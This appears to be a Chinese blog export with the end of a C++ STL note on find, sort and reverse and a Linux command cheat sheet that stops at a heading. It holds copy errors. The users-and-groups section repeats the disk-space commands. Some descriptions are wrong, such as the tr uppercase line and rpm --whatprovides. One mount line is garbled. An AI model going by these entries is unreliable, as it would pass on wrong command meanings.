find()查找算法可以在链表中查找元素，如果找到该元素，返回的是该元素的迭代器位置；如果没有找到，则返回
end()迭代器位置。</p>
<p><strong>注</strong>，find()算法需要声明头文件包含语句“#include
<algorithm>”。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//采用 find()查找算法在链表中查找 </span></span><br><span class="line">it=<span class="built_in">find</span>(l.<span class="built_in">begin</span>(),l.<span class="built_in">end</span>(),<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h2 id="sort-算法对向量元素排序"><strong>14、sort
算法对向量元素排序</strong></h2>
<p>使用 sort 算法，需要声明头文件“#include <algorithm>”</p>
<p>sort
算法要求使用随机访问迭代器进行排序，在默认的情况下，对向量元素进行升序排列。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure>
<p>可以自己设计排序比较函数，然后，把这个函数指定给 sort
算法，那么，sort 就根据这个比较函数指定的排序规则进行排序。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义排序比较函数：对元素的值进行降序排列</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Comp</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">if</span>(a!=b)<span class="keyword">return</span> a&gt;b; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> a&gt;b; </span><br><span class="line">&#125;</span><br><span class="line">…………</span><br><span class="line"><span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),Comp);<span class="comment">//注意，函数名后不加“（）”</span></span><br></pre></td></tr></table></figure>
<h2 id="reverse-反向排列算法"><strong>15、reverse
反向排列算法</strong></h2>
<p>reverse 反向排列算法，需要定义头文件“#include <algorithm>”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反向排列向量的从首到尾间的元素 </span></span><br><span class="line"><span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>程序设计</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 常用命令总结</title>
    <url>/2023/02/24/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>  <strong>Linux命令大全【下载后将后缀改成chm】：</strong><a
href="https://www.aliyundrive.com/s/WvnRwHfDDjK">https://www.aliyundrive.com/s/WvnRwHfDDjK</a></p>
<h3 id="系统信息查询">1、系统信息查询</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">arch</span> 显示机器的处理器架构(1)</span><br><span class="line"><span class="built_in">uname</span> -m 显示机器的处理器架构(2)</span><br><span class="line"><span class="built_in">uname</span> -r 显示正在使用的内核版本</span><br><span class="line">dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI)</span><br><span class="line">hdparm -i /dev/hda 罗列一个磁盘的架构特性</span><br><span class="line">hdparm -tT /dev/sda 在磁盘上执行测试性读取操作</span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo 显示CPU info的信息</span><br><span class="line"><span class="built_in">cat</span> /proc/interrupts 显示中断</span><br><span class="line"><span class="built_in">cat</span> /proc/meminfo 校验内存使用</span><br><span class="line"><span class="built_in">cat</span> /proc/swaps 显示哪些swap被使用</span><br><span class="line"><span class="built_in">cat</span> /proc/version 显示内核的版本</span><br><span class="line"><span class="built_in">cat</span> /proc/net/dev 显示网络适配器及统计</span><br><span class="line"><span class="built_in">cat</span> /proc/mounts 显示已加载的文件系统</span><br><span class="line">lspci -tv 罗列 PCI 设备</span><br><span class="line">lsusb -tv 显示 USB 设备</span><br><span class="line"><span class="built_in">date</span> 显示系统日期</span><br><span class="line">cal 2007 显示2007年的日历表</span><br><span class="line"><span class="built_in">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒</span><br><span class="line">clock -w 将时间修改保存到 BIOS</span><br></pre></td></tr></table></figure>
<h3 id="开关机">2、开关机</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shutdown -h now 关闭系统(1)</span><br><span class="line">init 0 关闭系统(2)</span><br><span class="line">telinit 0 关闭系统(3)</span><br><span class="line">shutdown -h hours:minutes &amp;amp; 按预定时间关闭系统</span><br><span class="line">shutdown -c 取消按预定时间关闭系统</span><br><span class="line">shutdown -r now 重启(1)</span><br><span class="line">reboot 重启(2)</span><br><span class="line"><span class="built_in">logout</span> 注销</span><br></pre></td></tr></table></figure>
<h3 id="文件目录操作">3、文件目录操作</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home 进入 <span class="string">&#x27;/ home&#x27;</span> 目录<span class="string">&#x27;</span></span><br><span class="line"><span class="string">cd .. 返回上一级目录</span></span><br><span class="line"><span class="string">cd ../.. 返回上两级目录</span></span><br><span class="line"><span class="string">cd 进入个人的主目录</span></span><br><span class="line"><span class="string">cd ~user1 进入个人的主目录</span></span><br><span class="line"><span class="string">cd - 返回上次所在的目录</span></span><br><span class="line"><span class="string">pwd 显示工作路径</span></span><br><span class="line"><span class="string">ls 查看目录中的文件</span></span><br><span class="line"><span class="string">ls -F 查看目录中的文件</span></span><br><span class="line"><span class="string">ls -l 显示文件和目录的详细资料</span></span><br><span class="line"><span class="string">ls -a 显示隐藏文件</span></span><br><span class="line"><span class="string">ls *[0-9]* 显示包含数字的文件名和目录名</span></span><br><span class="line"><span class="string">tree 显示文件和目录由根目录开始的树形结构(1)</span></span><br><span class="line"><span class="string">lstree 显示文件和目录由根目录开始的树形结构(2)</span></span><br><span class="line"><span class="string">mkdir dir1 创建一个叫做 &#x27;</span>dir1<span class="string">&#x27; 的目录&#x27;</span></span><br><span class="line"><span class="built_in">mkdir</span> dir1 dir2 同时创建两个目录</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树</span><br><span class="line"><span class="built_in">rm</span> -f file1 删除一个叫做 <span class="string">&#x27;file1&#x27;</span> 的文件<span class="string">&#x27;</span></span><br><span class="line"><span class="string">rmdir dir1 删除一个叫做 &#x27;</span>dir1<span class="string">&#x27; 的目录&#x27;</span></span><br><span class="line"><span class="built_in">rm</span> -rf dir1 删除一个叫做 <span class="string">&#x27;dir1&#x27;</span> 的目录并同时删除其内容</span><br><span class="line"><span class="built_in">rm</span> -rf dir1 dir2 同时删除两个目录及它们的内容</span><br><span class="line"><span class="built_in">mv</span> dir1 new_dir 重命名/移动 一个目录</span><br><span class="line"><span class="built_in">cp</span> file1 file2 复制一个文件</span><br><span class="line"><span class="built_in">cp</span> <span class="built_in">dir</span>/* . 复制一个目录下的所有文件到当前工作目录</span><br><span class="line"><span class="built_in">cp</span> -a /tmp/dir1 . 复制一个目录到当前工作目录</span><br><span class="line"><span class="built_in">cp</span> -a dir1 dir2 复制一个目录</span><br><span class="line"><span class="built_in">ln</span> -s file1 lnk1 创建一个指向文件或目录的软链接</span><br><span class="line"><span class="built_in">ln</span> file1 lnk1 创建一个指向文件或目录的物理链接</span><br><span class="line"><span class="built_in">touch</span> -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm)</span><br><span class="line">file file1 outputs the mime <span class="built_in">type</span> of the file as text</span><br><span class="line">iconv -l 列出已知的编码</span><br><span class="line">iconv -f fromEncoding -t toEncoding inputFile &amp;gt; outputFile creates a new from the given input file by assuming it is encoded <span class="keyword">in</span> fromEncoding and converting it to toEncoding.</span><br><span class="line">find . -maxdepth 1 -name *.jpg -<span class="built_in">print</span> -<span class="built_in">exec</span> convert <span class="string">&quot;&#123;&#125;&quot;</span> -resize 80x60 <span class="string">&quot;thumbs/&#123;&#125;&quot;</span> \; batch resize files <span class="keyword">in</span> the current directory and send them to a thumbnails directory (requires convert from Imagemagick)</span><br></pre></td></tr></table></figure>
<h3 id="文件查询">4、文件查询</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name file1 从 <span class="string">&#x27;/&#x27;</span> 开始进入根文件系统搜索文件和目录</span><br><span class="line">find / -user user1 搜索属于用户 <span class="string">&#x27;user1&#x27;</span> 的文件和目录</span><br><span class="line">find /home/user1 -name \*.bin 在目录 <span class="string">&#x27;/ home/user1&#x27;</span> 中搜索带有<span class="string">&#x27;.bin&#x27;</span> 结尾的文件</span><br><span class="line">find /usr/bin -<span class="built_in">type</span> f -atime +100 搜索在过去100天内未被使用过的执行文件</span><br><span class="line">find /usr/bin -<span class="built_in">type</span> f -mtime -10 搜索在10天内被创建或者修改过的文件</span><br><span class="line">find / -name \*.rpm -<span class="built_in">exec</span> <span class="built_in">chmod</span> 755 <span class="string">&#x27;&#123;&#125;&#x27;</span> \; 搜索以 <span class="string">&#x27;.rpm&#x27;</span> 结尾的文件并定义其权限</span><br><span class="line">find / -xdev -name \*.rpm 搜索以 <span class="string">&#x27;.rpm&#x27;</span> 结尾的文件，忽略光驱、捷盘等可移动设备</span><br><span class="line">locate \*.ps 寻找以 <span class="string">&#x27;.ps&#x27;</span> 结尾的文件 - 先运行 <span class="string">&#x27;updatedb&#x27;</span> 命令</span><br><span class="line">whereis halt 显示一个二进制文件、源码或man的位置</span><br><span class="line"><span class="built_in">which</span> halt 显示一个二进制文件或可执行文件的完整路径</span><br></pre></td></tr></table></figure>
<h3 id="文件系统挂载">5、文件系统挂载</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="string">&#x27;/ mnt/hda2&#x27;</span> 已经存在</span><br><span class="line">umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="string">&#x27;/ mnt/hda2&#x27;</span> 退出</span><br><span class="line">fuser -km /mnt/hda2 当设备繁忙时强制卸载</span><br><span class="line">umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用</span><br><span class="line">mount /dev/fd0 /mnt/floppy 挂载一个软盘</span><br><span class="line">mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom</span><br><span class="line">mount /dev/hdc /mnt/cdr利奴性ecorder 挂载一个cdrw或dvdrom</span><br><span class="line">mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom</span><br><span class="line">mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件</span><br><span class="line">mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统</span><br><span class="line">mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备</span><br><span class="line">mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享</span><br></pre></td></tr></table></figure>
<h3 id="磁盘空间">6、磁盘空间</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h 显示已经挂载的分区列表</span><br><span class="line"><span class="built_in">ls</span> -lSr more 以尺寸大小排列文件和目录</span><br><span class="line"><span class="built_in">du</span> -sh dir1 估算目录 <span class="string">&#x27;dir1&#x27;</span> 已经使用的磁盘空间<span class="string">&#x27;</span></span><br><span class="line"><span class="string">du -sk *  sort -rn 以容量大小为依据依次显示文件和目录的大小</span></span><br><span class="line"><span class="string">rpm -q -a --qf &#x27;</span>%10&#123;SIZE&#125;t%&#123;NAME&#125;n<span class="string">&#x27;  sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)</span></span><br><span class="line"><span class="string">dpkg-query -W -f=&#x27;</span><span class="variable">$&#123;Installed-Size;10&#125;</span>t<span class="variable">$&#123;Package&#125;</span>n<span class="string">&#x27;  sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统)</span></span><br></pre></td></tr></table></figure>
<h3 id="用户和群组">7、用户和群组</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h 显示已经挂载的分区列表</span><br><span class="line"><span class="built_in">ls</span> -lSr more 以尺寸大小排列文件和目录</span><br><span class="line"><span class="built_in">du</span> -sh dir1 估算目录 <span class="string">&#x27;dir1&#x27;</span> 已经使用的磁盘空间<span class="string">&#x27;</span></span><br><span class="line"><span class="string">du -sk *  sort -rn 以容量大小为依据依次显示文件和目录的大小</span></span><br><span class="line"><span class="string">rpm -q -a --qf &#x27;</span>%10&#123;SIZE&#125;t%&#123;NAME&#125;n<span class="string">&#x27;  sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)</span></span><br><span class="line"><span class="string">dpkg-query -W -f=&#x27;</span><span class="variable">$&#123;Installed-Size;10&#125;</span>t<span class="variable">$&#123;Package&#125;</span>n<span class="string">&#x27;  sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统)</span></span><br></pre></td></tr></table></figure>
<h3 id="文件权限">8、文件权限</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lh 显示权限</span><br><span class="line"><span class="built_in">ls</span> /tmp  <span class="built_in">pr</span> -T5 -W<span class="variable">$COLUMNS</span> 将终端划分成5栏显示</span><br><span class="line"><span class="built_in">chmod</span> ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限</span><br><span class="line"><span class="built_in">chmod</span> go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限</span><br><span class="line"><span class="built_in">chown</span> user1 file1 改变一个文件的所有人属性</span><br><span class="line"><span class="built_in">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性</span><br><span class="line"><span class="built_in">chgrp</span> group1 file1 改变文件的群组</span><br><span class="line"><span class="built_in">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性</span><br><span class="line">find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件</span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</span><br><span class="line"><span class="built_in">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位</span><br><span class="line"><span class="built_in">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</span><br><span class="line"><span class="built_in">chmod</span> g-s /home/public 禁用一个目录的 SGID 位</span><br><span class="line"><span class="built_in">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</span><br><span class="line"><span class="built_in">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位</span><br></pre></td></tr></table></figure>
<h3 id="文件特殊属性">9、文件特殊属性</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +a file1 只允许以追加方式读写文件</span><br><span class="line">chattr +c file1 允许这个文件能被内核自动压缩/解压</span><br><span class="line">chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件</span><br><span class="line">chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接</span><br><span class="line">chattr +s file1 允许一个文件被安全地删除</span><br><span class="line">chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</span><br><span class="line">chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件</span><br><span class="line">lsattr 显示特殊的属性</span><br></pre></td></tr></table></figure>
<h3 id="文件压缩解压">10、文件压缩解压</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bunzip2 file1.bz2 解压一个叫做 <span class="string">&#x27;file1.bz2&#x27;</span>的文件</span><br><span class="line">bzip2 file1 压缩一个叫做 <span class="string">&#x27;file1&#x27;</span> 的文件</span><br><span class="line">gunzip file1.gz 解压一个叫做 <span class="string">&#x27;file1.gz&#x27;</span>的文件</span><br><span class="line">gzip file1 压缩一个叫做 <span class="string">&#x27;file1&#x27;</span>的文件</span><br><span class="line">gzip -9 file1 最大程度压缩</span><br><span class="line">rar a file1.rar test_file 创建一个叫做 <span class="string">&#x27;file1.rar&#x27;</span> 的包</span><br><span class="line">rar a file1.rar file1 file2 dir1 同时压缩 <span class="string">&#x27;file1&#x27;</span>, <span class="string">&#x27;file2&#x27;</span> 以及目录 <span class="string">&#x27;dir1&#x27;</span></span><br><span class="line">rar x file1.rar 解压rar包</span><br><span class="line">unrar x file1.rar 解压rar包</span><br><span class="line">tar -cvf archive.tar file1 创建一个非压缩的 tarball</span><br><span class="line">tar -cvf archive.tar file1 file2 dir1 创建一个包含了 <span class="string">&#x27;file1&#x27;</span>, <span class="string">&#x27;file2&#x27;</span> 以及 <span class="string">&#x27;dir1&#x27;</span>的档案文件</span><br><span class="line">tar -tf archive.tar 显示一个包中的内容</span><br><span class="line">tar -xvf archive.tar 释放一个包</span><br><span class="line">tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下</span><br><span class="line">tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包</span><br><span class="line">tar -xvfj archive.tar.bz2 解压一个bzip2格式的压缩包</span><br><span class="line">tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包</span><br><span class="line">tar -xvfz archive.tar.gz 解压一个gzip格式的压缩包</span><br><span class="line">zip file1.zip file1 创建一个zip格式的压缩包</span><br><span class="line">zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包</span><br><span class="line">unzip file1.zip 解压一个zip格式压缩包</span><br></pre></td></tr></table></figure>
<h3 id="rpm-包---fedora-redhat-及类似系统">11、RPM 包 - （Fedora, Redhat
及类似系统）</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -ivh package.rpm 安装一个rpm包</span><br><span class="line">rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告</span><br><span class="line">rpm -U package.rpm 更新一个rpm包但不改变其配置文件</span><br><span class="line">rpm -F package.rpm 更新一个确定已经安装的rpm包</span><br><span class="line">rpm -e package_name.rpm 删除一个rpm包</span><br><span class="line">rpm -qa 显示系统中所有已经安装的rpm包</span><br><span class="line">rpm -qa  grep httpd 显示所有名称中包含 <span class="string">&quot;httpd&quot;</span> 字样的rpm包</span><br><span class="line">rpm -qi package_name 获取一个已安装包的特殊信息</span><br><span class="line">rpm -qg <span class="string">&quot;System Environment/Daemons&quot;</span> 显示一个组件的rpm包</span><br><span class="line">rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表</span><br><span class="line">rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表</span><br><span class="line">rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表</span><br><span class="line">rpm -q package_name --whatprovides 显示一个rpm包所占的体积</span><br><span class="line">rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l</span><br><span class="line">rpm -q package_name --changelog 显示一个rpm包的修改历史</span><br><span class="line">rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供</span><br><span class="line">rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表</span><br><span class="line">rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书</span><br><span class="line">rpm --checksig package.rpm 确认一个rpm包的完整性</span><br><span class="line">rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性</span><br><span class="line">rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间</span><br><span class="line">rpm -Va 检查系统中所有已安装的rpm包- 小心使用</span><br><span class="line">rpm -Vp package.rpm 确认一个rpm包还未安装</span><br><span class="line">rpm2cpio package.rpm  cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件</span><br><span class="line">rpm -ivh /usr/src/redhat/RPMS/`<span class="built_in">arch</span>`/package.rpm 从一个rpm源码安装一个构建好的包</span><br><span class="line">rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包</span><br></pre></td></tr></table></figure>
<h3 id="yum-软件包升级器---fedora-redhat-及类似系统">12、YUM
软件包升级器 - （Fedora, RedHat 及类似系统）</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install package_name 下载并安装一个rpm包</span><br><span class="line">yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</span><br><span class="line">yum update package_name.rpm 更新当前系统中所有安装的rpm包</span><br><span class="line">yum update package_name 更新一个rpm包</span><br><span class="line">yum remove package_name 删除一个rpm包</span><br><span class="line">yum list 列出当前系统中安装的所有包</span><br><span class="line">yum search package_name 在rpm仓库中搜寻软件包</span><br><span class="line">yum clean packages 清理rpm缓存删除下载的包</span><br><span class="line">yum clean headers 删除所有头文件</span><br><span class="line">yum clean all 删除所有缓存的包和头文件</span><br></pre></td></tr></table></figure>
<h3 id="deb-包-debian-ubuntu-以及类似系统">13、DEB 包 (Debian, Ubuntu
以及类似系统)</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg -i package.deb 安装/更新一个 deb 包</span><br><span class="line">dpkg -r package_name 从系统删除一个 deb 包</span><br><span class="line">dpkg -l 显示系统中所有已经安装的 deb 包</span><br><span class="line">dpkg -l  grep httpd 显示所有名称中包含 <span class="string">&quot;httpd&quot;</span> 字样的deb包</span><br><span class="line">dpkg -s package_name 获得已经安装在系统中一个特殊包的信息</span><br><span class="line">dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表</span><br><span class="line">dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表</span><br><span class="line">dpkg -S /bin/ping 确认所给的文件由哪个deb包提供</span><br></pre></td></tr></table></figure>
<h3 id="apt-软件工具-debian-ubuntu-以及类似系统">14、APT 软件工具
(Debian, Ubuntu 以及类似系统)</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install package_name 安装/更新一个 deb 包</span><br><span class="line">apt-cdrom install package_name 从光盘安装/更新一个 deb 包</span><br><span class="line">apt-get update 升级列表中的软件包</span><br><span class="line">apt-get upgrade 升级所有已安装的软件</span><br><span class="line">apt-get remove package_name 从系统删除一个deb包</span><br><span class="line">apt-get check 确认依赖的软件仓库正确</span><br><span class="line">apt-get clean 从下载的软件包中清理缓存</span><br><span class="line">apt-cache search searched-package 返回包含所要搜索字符串的软件包名称</span><br></pre></td></tr></table></figure>
<h3 id="查看文件内容">15、查看文件内容</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> file1 从第一个字节开始正向查看文件的内容</span><br><span class="line"><span class="built_in">tac</span> file1 从最后一行开始反向查看一个文件的内容</span><br><span class="line">more file1 查看一个长文件的内容</span><br><span class="line">less file1 类似于 <span class="string">&#x27;more&#x27;</span> 命令，但是它允许在文件中和正向操作一样的反向操作</span><br><span class="line"><span class="built_in">head</span> -2 file1 查看一个文件的前两行</span><br><span class="line"><span class="built_in">tail</span> -2 file1 查看一个文件的最后两行</span><br><span class="line"><span class="built_in">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容</span><br></pre></td></tr></table></figure>
<h3 id="文本处理">16、文本处理</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> file1 file2 ...  <span class="built_in">command</span> &amp;lt;&amp;gt; file1_in.txt_or_file1_out.txt general syntax <span class="keyword">for</span> text manipulation using PIPE, STDIN and STDOUT</span><br><span class="line"><span class="built_in">cat</span> file1  <span class="built_in">command</span>( sed, grep, awk, grep, etc...) &amp;gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中</span><br><span class="line"><span class="built_in">cat</span> file1  <span class="built_in">command</span>( sed, grep, awk, grep, etc...) &amp;gt;&amp;gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中</span><br><span class="line">grep Aug /var/log/messages 在文件 <span class="string">&#x27;/var/log/messages&#x27;</span>中查找关键词<span class="string">&quot;Aug&quot;</span></span><br><span class="line">grep ^Aug /var/log/messages 在文件 <span class="string">&#x27;/var/log/messages&#x27;</span>中查找以<span class="string">&quot;Aug&quot;</span>开始的词汇</span><br><span class="line">grep [0-9] /var/log/messages 选择 <span class="string">&#x27;/var/log/messages&#x27;</span> 文件中所有包含数字的行</span><br><span class="line">grep Aug -R /var/log/* 在目录 <span class="string">&#x27;/var/log&#x27;</span> 及随后的目录中搜索字符串<span class="string">&quot;Aug&quot;</span></span><br><span class="line">sed <span class="string">&#x27;s/stringa1/stringa2/g&#x27;</span> example.txt 将example.txt文件中的 <span class="string">&quot;string1&quot;</span> 替换成 <span class="string">&quot;string2&quot;</span></span><br><span class="line">sed <span class="string">&#x27;/^$/d&#x27;</span> example.txt 从example.txt文件中删除所有空白行</span><br><span class="line">sed <span class="string">&#x27;/ *#/d; /^$/d&#x27;</span> example.txt 从example.txt文件中删除所有注释和空白行</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;esempio&#x27;</span>  <span class="built_in">tr</span> <span class="string">&#x27;[:lower:]&#x27;</span> <span class="string">&#x27;[:upper:]&#x27;</span> 合并上下单元格内容</span><br><span class="line">sed -e <span class="string">&#x27;1d&#x27;</span> result.txt 从文件example.txt 中排除第一行</span><br><span class="line">sed -n <span class="string">&#x27;/stringa1/p&#x27;</span> 查看只包含词汇 <span class="string">&quot;string1&quot;</span>的行</span><br><span class="line">sed -e <span class="string">&#x27;s/ *$//&#x27;</span> example.txt 删除每一行最后的空白字符</span><br><span class="line">sed -e <span class="string">&#x27;s/stringa1//g&#x27;</span> example.txt 从文档中只删除词汇 <span class="string">&quot;string1&quot;</span> 并保留剩余全部</span><br><span class="line">sed -n <span class="string">&#x27;1,5p;5q&#x27;</span> example.txt 查看从第一行到第5行内容</span><br><span class="line">sed -n <span class="string">&#x27;5p;5q&#x27;</span> example.txt 查看第5行</span><br><span class="line">sed -e <span class="string">&#x27;s/00*/0/g&#x27;</span> example.txt 用单个零替换多个零</span><br><span class="line"><span class="built_in">cat</span> -n file1 标示文件的行数</span><br><span class="line"><span class="built_in">cat</span> example.txt  awk <span class="string">&#x27;NR%2==1&#x27;</span> 删除example.txt文件中的所有偶数行</span><br><span class="line"><span class="built_in">echo</span> a b c  awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> 查看一行第一栏</span><br><span class="line"><span class="built_in">echo</span> a b c  awk <span class="string">&#x27;&#123;print $1,$3&#125;&#x27;</span> 查看一行的第一和第三栏</span><br><span class="line"><span class="built_in">paste</span> file1 file2 合并两个文件或两栏的内容</span><br><span class="line"><span class="built_in">paste</span> -d <span class="string">&#x27;+&#x27;</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="string">&quot;+&quot;</span>区分</span><br><span class="line"><span class="built_in">sort</span> file1 file2 排序两个文件的内容</span><br><span class="line"><span class="built_in">sort</span> file1 file2  <span class="built_in">uniq</span> 取出两个文件的并集(重复的行只保留一份)</span><br><span class="line"><span class="built_in">sort</span> file1 file2  <span class="built_in">uniq</span> -u 删除交集，留下其他的行</span><br><span class="line"><span class="built_in">sort</span> file1 file2  <span class="built_in">uniq</span> -d 取出两个文件的交集(只留下同时存在于两个文件中的文件)</span><br><span class="line"><span class="built_in">comm</span> -1 file1 file2 比较两个文件的内容只删除 <span class="string">&#x27;file1&#x27;</span> 所包含的内容</span><br><span class="line"><span class="built_in">comm</span> -2 file1 file2 比较两个文件的内容只删除 <span class="string">&#x27;file2&#x27;</span> 所包含的内容</span><br><span class="line"><span class="built_in">comm</span> -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分</span><br></pre></td></tr></table></figure>
<h3 id="字符设置和文件格式转换">17、字符设置和文件格式转换</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX</span><br><span class="line">unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS</span><br><span class="line">recode ..HTML &amp;lt; page.txt &amp;gt; page.html 将一个文本文件转换成html</span><br><span class="line">recode -l  more 显示所有允许的转换格式</span><br></pre></td></tr></table></figure>
<h3 id="文件系统分析">18、文件系统分析</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块</span><br><span class="line">fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性</span><br><span class="line">fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</span><br><span class="line">e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</span><br><span class="line">e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</span><br><span class="line">fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</span><br><span class="line">fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性</span><br><span class="line">fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</span><br><span class="line">dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</span><br></pre></td></tr></table></figure>
<h3 id="初始化一个文件系统">19、初始化一个文件系统</h3>
